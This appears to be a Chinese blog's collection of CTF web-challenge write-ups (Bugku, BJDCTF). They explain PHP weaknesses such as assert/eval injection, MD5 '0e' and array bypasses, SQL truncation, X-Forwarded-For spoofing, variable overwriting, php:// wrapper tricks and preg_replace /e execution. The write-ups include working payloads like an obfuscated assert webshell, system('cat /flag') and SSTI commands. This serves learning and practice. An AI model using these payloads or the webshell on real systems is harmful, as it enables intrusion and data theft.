<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">filePath=<span class="string">r&quot;C:\Users\10452\Desktop\src&quot;</span></span><br><span class="line">files = os.listdir(filePath)</span><br><span class="line">print(len(files))</span><br><span class="line"><span class="comment">#3002 所以一共有3002个文件</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> open(file,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:<span class="comment">#这个是打开文件的方式</span></span><br><span class="line">     gets=list(re.findall(<span class="string">&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">     posts = list(re.findall(<span class="string">&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">    <span class="comment">#两个正则表达式，用来匹配GET和POST，这里可以学习一下其书写方式:</span></span><br><span class="line">    <span class="comment">#这里的反斜杠都是为了避免歧义的，屏蔽掉在python正则表达式中原本的功能</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> open（<span class="string">&#x27;路径&#x27;</span>,<span class="string">&#x27;r&#x27;</span>）<span class="keyword">as</span> f:</span><br><span class="line">    print(f.read())<span class="comment">#打开文件并读取</span></span><br></pre></td></tr></table></figure>

<p>这里尝试一下:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">filePath=r<span class="string">&quot;C:\Users\10452\Desktop\src&quot;</span></span><br><span class="line">files = os.listdir(filePath)</span><br><span class="line">file=filePath+<span class="string">&quot;\\&quot;</span>+files[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">print</span>(file)</span><br><span class="line">with open(file,encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">print</span>(f.read())</span><br></pre></td></tr></table></figure>

<p>正则 re.findall  的简单用法（返回string中所有与pattern相匹配的全部字串，返回形式为数组）<br>语法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">//re.findall(pattern, string, flags = <span class="number">0</span> )</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">a=<span class="string">&quot;asdasd&quot;</span></span><br><span class="line">print(re.findall(<span class="string">&quot;asd&quot;</span>,a))</span><br></pre></td></tr></table></figure>

<p><strong>设置线程</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">s1=threading.Semaphore(<span class="number">100</span>)  </span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span></span><br><span class="line">s1.acquire() </span><br></pre></td></tr></table></figure>

<p>semaphore学习:<a href="https://my.oschina.net/u/3524921/blog/920303">https://my.oschina.net/u/3524921/blog/920303</a></p>
<p>没学过也就这几个了，接下来上手复写一下:<br>感受一下大佬的代码，python还是需要继续学习！</p>
<p>有个槽点:这里的system针对的是linux系统内的echo 所以需要更换一下</p>
<p>这里是payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;xk0SzyKwfzw.php?Efa5BVG&#x3D;cat &#x2F;flag</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>bugku2</title>
    <url>/2021/01/30/bugku2/</url>
    <content><![CDATA[<h2 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $poc=<span class="string">&quot;a#s#s#e#r#t&quot;</span>; $poc_1=explode(<span class="string">&quot;#&quot;</span>,$poc); $poc_2=$poc_1[<span class="number">0</span>].$poc_1[<span class="number">1</span>].$poc_1[<span class="number">2</span>].$poc_1[<span class="number">3</span>].$poc_1[<span class="number">4</span>].$poc_1[<span class="number">5</span>]; $poc_2($_GET[<span class="string">&#x27;s&#x27;</span>]) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个explode(“a”,$b),以a为分隔，将b分割成一个个数组           <a id="more"></a></p>
<p>还是比较无语的，这段话翻译过来就是:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">assert($_GET[<span class="string">&#x27;s&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>接下来让我们康康这个assert()函数是干啥的</p>
<p>assert($assertion) — 检查一个断言是否为 FALSE<br>有一点和eval函数很像<br>它如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。<br><a href="https://www.smi1e.top/%E6%B5%85%E8%B0%88eval%E5%92%8Cassert/">https://www.smi1e.top/%E6%B5%85%E8%B0%88eval%E5%92%8Cassert/</a></p>
<p>所以我们可以直接构造payload:<br><code>?s=指令</code>，<strong>接下来我们就康康有什么是可以查看目录下文件的指令获取更多信息吧</strong></p>
<p>1.scandir() 列出指定路径中的文件和目录<br>这是一个array，所以要输出需要用print_r<br>2.直接使用system指令:<br>system(ls)<br>system(dir)<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210130155826.png" alt="img" style="zoom:67%;"><br>看到有两个文件，直接打开就行</p>
<h2 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h2><p>又要写亲爱的脚本了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s = requests.session()//建立连接</span><br><span class="line">url=<span class="string">&#x27;http://114.67.246.176:11655/&#x27;</span></span><br><span class="line">headers = s.get(url).headers</span><br><span class="line">req = s.get(url)//get数据</span><br><span class="line">a = req.text[req.text.find(<span class="string">&#x27;about&#x27;</span>)+<span class="number">5</span>:req.text.find(<span class="string">&#x27;=?&#x27;</span>)]//截取算式</span><br><span class="line">print(a)//我的调试</span><br><span class="line">aa = eval(a)//eval()函数和PHP的类似，可以直接将其中的当做代码运行，所以直接将算式得出</span><br><span class="line">d = &#123;<span class="string">&#x27;value&#x27;</span>:aa&#125;//让post的值为aa</span><br><span class="line">req = s.post(url,data=d)</span><br><span class="line">print(req.text)</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210130162705.png" alt="img" style="zoom:67%;">
可能要多运行几次，应该这个数太大了然后就可以了

<h2 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h2><p>这题是有一个正则表达式</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="string">&#x27;2.php&#x27;</span>);$key=<span class="string">&#x27;flag&#123;********************************&#125;&#x27;</span>;</span><br><span class="line">$IM= preg_match(<span class="string">&quot;/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;</span>, trim($_GET[<span class="string">&quot;id&quot;</span>]), $match);</span><br><span class="line"><span class="keyword">if</span>( $IM )&#123;  </span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;key is: &#x27;</span>.$key);&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>也就是从我们输入的id当中，满足那个正则表达式才行<br>将正则表达式进行拆分:</p>
<h3 id="正则表达学习"><a href="#正则表达学习" class="headerlink" title="正则表达学习"></a>正则表达学习</h3><dl><dt>key:匹配key字符<br>.*:点是匹配除了换行符以外的任意字符,加了星号表示匹配多个正则表达式<br>key：再匹配一次key，<br>.{4,7}:匹配4-7次的任意字符（除换行符）<br>key：再匹配一次key</dt><dd>匹配普通字符:<br>/：匹配一次/<br>.:在任意匹配一个字符<br>/：在匹配一次/<br>(.*key）同上匹配，()只改变逻辑顺序<br>[a-z]匹配a-z任意一个字符<br>[:punct:]:特殊字符，在加一个中括号，就是在特殊字符中去一个<br>根据以上:<br><em>keyakeyaaaaakey:/a/akeyb@</em><br>然后就可以获得flag</dd></dl><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210130165308.png" alt="img" style="zoom:67%;">

<h2 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h2><p>查看页面源码，发现有个code.txt，点进去，即可看到源码:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = $_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    $v3 = $_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!strcmp($v3, $flag))&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以知道他需要我们传入3个值 且v1=v2 v3不等于flag。查询可以知道，如果两个类型不一样也会直接返回0，flag是字符串，所以我们构造一个字符数组，所以payload为:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">?v1=QNKCDZO&amp;v2=240610708&amp;v3[]=f</span><br></pre></td></tr></table></figure>

<h2 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h2><p>根据提示，这题需要的是hint:sql约束攻击，学习了一下什么是sql约束攻击:<br>参考:<a href="https://www.freebuf.com/articles/web/124537.html">https://www.freebuf.com/articles/web/124537.html</a><br>总结一下就是，在一般情况下，SQL执行操作时，会将查询字符串末尾的空格一并删除，特殊情况看以上博客<br>当我们插入一个新数据，admin（很多空格）1，但是数据库有插入长度限制，比如说是10，那么我们插入的这个数据10位以后的数据将被舍弃，变成admin(5个空格)，接下来执行select查询的时候，这个五个空格又会被自动忽略，查询的就是admin了</p>
<p>在本题中：<br>我先注册了一个admin(+3个空格)1的账号，发现后面的1没有被约束掉，所以继续增加空格数量，注册后<br>输入admin以及我们刚设的新密码，即可登录管理员帐号<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210130191235.png" alt="img" style="zoom:67%;"></p>
<h2 id="web26"><a href="#web26" class="headerlink" title="web26"></a>web26</h2><p>Referer: <a href="https://www.google.com/">https://www.google.com</a></p>
<h2 id="web27"><a href="#web27" class="headerlink" title="web27"></a>web27</h2><p>好像是缺少了源码:<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210130230148.png" alt="img" style="zoom:67%;"><br>QNKCDZO的MD5加密：0e830400451993494058024219903391<br>让我们get一个a；</p>
<h3 id="MD5碰撞"><a href="#MD5碰撞" class="headerlink" title="MD5碰撞"></a>MD5碰撞</h3><h4 id="ctf中md5常见绕过"><a href="#ctf中md5常见绕过" class="headerlink" title="ctf中md5常见绕过"></a>ctf中md5常见绕过</h4><h5 id="字符串0e"><a href="#字符串0e" class="headerlink" title="字符串0e:"></a>字符串0e:</h5><p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s878926199a  </span><br><span class="line">0e545993274517709034328855841020  </span><br><span class="line">s155964671a  </span><br><span class="line">0e342768416822451524974117254469  </span><br><span class="line">s214587387a  </span><br><span class="line">0e848240448830537924465865611904  </span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1184209335a</span><br><span class="line">0e072485820392773389523109082030</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s532378020a</span><br><span class="line">0e220463095855511507588041205815</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br></pre></td></tr></table></figure>

<h5 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h5><p>当md5接受的参数为数组时，其值都为0，所以构造payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?a[]&#x3D;1&amp;b[]&#x3D;2</span><br></pre></td></tr></table></figure>

<h5 id="真实碰撞"><a href="#真实碰撞" class="headerlink" title="真实碰撞"></a>真实碰撞</h5><p>使用MD5快速碰撞软件</p>
<p><a href="https://muouim.github.io/2019/01/30/MD5%E7%A2%B0%E6%92%9E/%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5">https://muouim.github.io/2019/01/30/MD5%E7%A2%B0%E6%92%9E/参考链接</a></p>
<h2 id="web28"><a href="#web28" class="headerlink" title="web28"></a>web28</h2><h4 id="XFF伪造"><a href="#XFF伪造" class="headerlink" title="XFF伪造"></a>XFF伪造</h4><p>跟前面有一题是一样的<br>payload：<br>burp抓包，然后添加，X-Forwarded-For:127.0.0.1</p>
<h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><p>这一关有源码，我们直接看源码了:<br>id就是输入margin<br>然后因为哈希一样，这里就尝试一下使用数组绕过了，可以成功<br>不过有个值要用post 发送数据</p>
<h2 id="web30："><a href="#web30：" class="headerlink" title="web30："></a>web30：</h2><p>提示说txt，打开以后出现源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($ac))</span><br><span class="line">&#123;</span><br><span class="line">$f = trim(file_get_contents($fn));</span><br><span class="line"><span class="keyword">if</span> ($ac === $f)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;This is flag:&quot;</span> .<span class="string">&quot; <span class="subst">$flag</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;sorry!&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>用了一个file_get_contents函数，意思是从文本中获取值，哪来的文本呢？想起来提示说txt文件，那文件名是啥，看了一下提示，说是flag.txt（果然猜就是神），那就直接但是似乎是，ac和fn的值都是要我们传的，这里有两种方法:<br>首先介绍一下：<br>方法一**:使用现成文件**<br>file_get_contents ( string <code>$filename</code> , bool <code>$use_include_path</code> = false , resource <code>$context</code> = ? , int <code>$offset</code> = -1 , int <code>$maxlen</code> = ? ) : string</p>
<p>这个filname是指文件名称：，也就说这边直接输入文件名就可以将文件内容以字符串的形式传入变量，所以<br>我们可以直接构造payload:<br>?ac=bugku&amp;filename=flag.txt</p>
<p>方法二：<strong>用php://input构造文件</strong><br><img src="/.com//blog\hexo\source\_posts\bugku2\I`[E`~MC`4GZB6WE[~B{`%X.png" style="zoom:67%;"></p>
<p>就行了</p>
]]></content>
      <tags>
        <tag>bugku2</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctf6</title>
    <url>/2021/04/01/buuctf6/</url>
    <content><![CDATA[<h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p>算是一道比较意外的题目吧，发现X-Forwarded-For的内容会被显示，想说会不会是命令注入尝试了一下发现被原样输出了，接下来就没有其他思路了<br>看了一下wp，发现是ssti注入，但是跟以前又不同，这里可以直接使用系统命令,所以是php模板注入！ <a id="more"></a><br>paylaod:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;system(&#39;ls&#39;)&#125;&#125;</span><br><span class="line">&#123;&#123;system(&#39;cat &#x2F;flag&#39;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>git泄露，扫一波拿到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">$yds = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line">$is = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line">$handsome = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line">                  </span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $x =&gt; $y)&#123;<span class="comment">//</span></span><br><span class="line">    $$x = $y;<span class="comment">//让x的键名=$y eg:$yds=&#x27;dog&#x27;传入yds=is所以此时 x=yds=dog 变成x=yds=is所以，其实post是没有用的，因为传入的键名只会作为一个值赋给x的键值的键值</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;<span class="comment">//</span></span><br><span class="line">    $$x = $$y;<span class="comment">//对于get参数: 直接互换，比如说x=yds=dog y=is=cat 那么此时 yds=cat</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">&#x27;flag&#x27;</span>] === $x &amp;&amp; $x !== <span class="string">&#x27;flag&#x27;</span>)&#123;<span class="comment">//get键名为flag的值和x的值相等 但是x的值也即键名不等flag？真的绕，笑死根本进不去</span></span><br><span class="line">        <span class="keyword">exit</span>($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>($_POST[<span class="string">&#x27;flag&#x27;</span>]))&#123;<span class="comment">//get键名为flag的值为空且postflag的值为空，那么就会进来</span></span><br><span class="line">    <span class="keyword">exit</span>($yds);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//postflag的值等于flag或者getflag的值等于flag</span></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || $_GET[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>($is);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.$flag;</span><br></pre></td></tr></table></figure>

<p>审计审计~</p>
<h4 id="导致的变量覆盖问题"><a href="#导致的变量覆盖问题" class="headerlink" title="$$导致的变量覆盖问题"></a><strong>$$导致的变量覆盖问题</strong></h4><p><strong>1.$$介绍</strong><br> <strong>$$这种写法称为可变变量</strong><br> <strong>一个可变变量获取了一个普通变量的值作为这个可变变量的变量名。</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">&quot;hello&quot;</span>;</span><br><span class="line">$$a=<span class="string">&#x27;world&#x27;</span>;<span class="comment">//此时$hello=&quot;world&quot;;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$a</span> $<span class="subst">&#123;$a&#125;</span>&quot;</span>;<span class="comment">//相当于$a被解析（被执行为world）</span></span><br></pre></td></tr></table></figure>

<p><strong>2.漏洞产生</strong><br> <strong>使用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值。因此就产生了变量覆盖漏洞。</strong><br> <strong>举例</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">$&#123;$key&#125; = $value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>get得到的数据$key和$value,关键第3行,${$key}用get传进来的$key做为新的变量,将get传进来的$value赋值给它。<br> get ?a=1 第3行回解析为$a=1。就造成了变量覆盖。</p>
<p><strong>exit()函数：</strong>在函数结束脚本的运行时会输出一个信息</p>
<p>在此题中，一开始我以为只要绕过那几个判断，执行到echo的判断就行了，但是其实是不行的，我没有注意到期间$flag的值是否会发生改变，因为这是include’flag.php’的，在index.php修改$flag的值也会覆盖修改flag.php当中的值，那么此时就有两种思路：</p>
<p>1.绕过两个判断但是不改变最终echo里面$flag的值(失败~)<br>2.进入判断，让判断中exit的变量等于flag的值:</p>
<p>这里需要先了解一下代码的执行过程：</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210404193937.png" alt="img" style="zoom:67%;">
可以看到x为键名，y为键值，弄清楚这个，开始正式构造payload，先代码分析一波：
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210404194543.png" alt="img" style="zoom:67%;">
搞清楚这个继续往下

<h4 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h4><p>从exit(yds)入手试试：这里就很简单了，直接用get类型的传入一个yds=flag<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210404200657.png" alt="img" style="zoom: 50%;"></p>
<h4 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">is&#x3D;flag&amp;flag&#x3D;flag</span><br></pre></td></tr></table></figure>



<h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?text&#x3D;php:&#x2F;&#x2F;input&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;next.php</span><br></pre></td></tr></table></figure>

<p>考察伪协议，使用inpu传入I have a dream绕过第一个判断 进入文件包含，此时过滤flag.php 但是又无法使用data协议看到提示next.php，于是使用filter协议打开:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$id &#x3D; $_GET[&#39;id&#39;];</span><br><span class="line">$_SESSION[&#39;id&#39;] &#x3D; $id;</span><br><span class="line"></span><br><span class="line">function complex($re, $str) &#123;</span><br><span class="line">    return preg_replace(</span><br><span class="line">        &#39;&#x2F;(&#39; . $re . &#39;)&#x2F;ei&#39;,</span><br><span class="line">        &#39;strtolower(&quot;\\1&quot;)&#39;,</span><br><span class="line">        $str</span><br><span class="line">    );+</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">foreach($_GET as $re &#x3D;&gt; $str) &#123;</span><br><span class="line">    echo complex($re, $str). &quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getFlag()&#123;</span><br><span class="line">	@eval($_GET[&#39;cmd&#39;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>到了这里就是只是盲区了，一直在想如何引用getFlag这个函数，但主要是正则表达式没读懂，</p>
<h4 id="preg-replace函数之命令执行"><a href="#preg-replace函数之命令执行" class="headerlink" title="preg_replace函数之命令执行"></a>preg_replace函数之命令执行</h4><blockquote>
<p><a href="http://php.net/manual/zh/function.preg-replace.php"><strong>preg_replace</strong></a>：(PHP 5.5)</p>
<p><strong>功能</strong> ： 函数执行一个正则表达式的搜索和替换</p>
<p><strong>定义</strong> ： <code>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</code></p>
<p>搜索 <strong>subject</strong> 中匹配 <strong>pattern</strong> 的部分， 如果匹配成功以 <strong>replacement</strong> 进行替换</p>
</blockquote>
<ul>
<li><strong>$pattern</strong> 存在 <strong>/e</strong> 模式修正符，允许代码执行</li>
<li><strong>/e</strong> 模式修正符，使<strong>preg_reslace()</strong> 将 <strong>$replacement</strong> 当做php代码来执行</li>
</ul>
<p><strong>漏洞解析：</strong><br>这道题目考察的是 <strong>preg_replace</strong> 函数使用 <strong>/e</strong> 模式，导致代码执行的问题。我们发现在上图代码 <strong>第11行</strong> 处，将 <strong>GET</strong> 请求方式传来的参数用在了 <strong>complexStrtolower</strong> 函数中，而变量 <strong>$regex</strong> 和 <strong>$value</strong> 又用在了存在代码执行模式的 <strong>preg_replace</strong> 函数中。所以，我们可以通过控制 <strong>preg_replace</strong> 函数第1个、第3个参数，来执行代码。但是可被当做代码执行的第2个参数，却固定为 <strong>‘strtolower(“\\1”)’</strong> 。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">反向引用</span><br><span class="line"></span><br><span class="line">对一个正则表达式模式或部分模式 **两边添加圆括号** 将导致相关 **匹配存储到一个临时缓冲区** 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 &#39;\n&#39; 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。</span><br><span class="line">可变变量：</span><br><span class="line">下面再说说我们为什么要匹配到 &#123;$&#123;phpinfo()&#125;&#125; 或者 $&#123;phpinfo()&#125; ，才能执行 phpinfo 函数，这是一个小坑。这实际上是 PHP可变变量 的原因。在PHP中双引号包裹的字符串中可以解析变量，而单引号则不行。 $&#123;phpinfo()&#125; 中的 phpinfo() 会被当做变量先执行，执行后，即变成 $&#123;1&#125; (phpinfo()成功执行返回true)。</span><br></pre></td></tr></table></figure>

<p>这边比较难理解的应该是这个反向引用，所以我用了代码调试一下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">这里先阐述一下我的理解，\<span class="number">1</span>可以储存表达式，pattern匹配到的subject的内容将会被存储在strtolower中执行，所以此时我们需要做的就是看什么样的函数构造形式可以在strtolower(<span class="string">&quot;&quot;</span>)中执行，所以此时引入可变变量的知识，上一关的可变变量中，我们理解了$$a实际上是先解析执行了$a这里我们引入$&#123;phpinfo()&#125;也是这种用处，我们传入这个值接下来就变成$str=$&#123;phpinfo()&#125;也就是$$&#123;phpinfo()&#125;，此时&#123;phpinfo()&#125;就会被执行返回<span class="number">1</span>，变成$<span class="number">1</span>,而且需要注意的是由于这里是双引号才可以这样解析，总结起来就是：</span><br><span class="line">\<span class="number">1</span>缓存了我们输入的表达——&gt;该参数可以代码执行——&gt;双引号内变量解析——&gt;引发代码执行变量名</span><br><span class="line">ps：这里我在本地运行的时候其实&#123;$&#123;&#125;&#125;或者$&#123;&#125;都是可以的</span><br></pre></td></tr></table></figure>

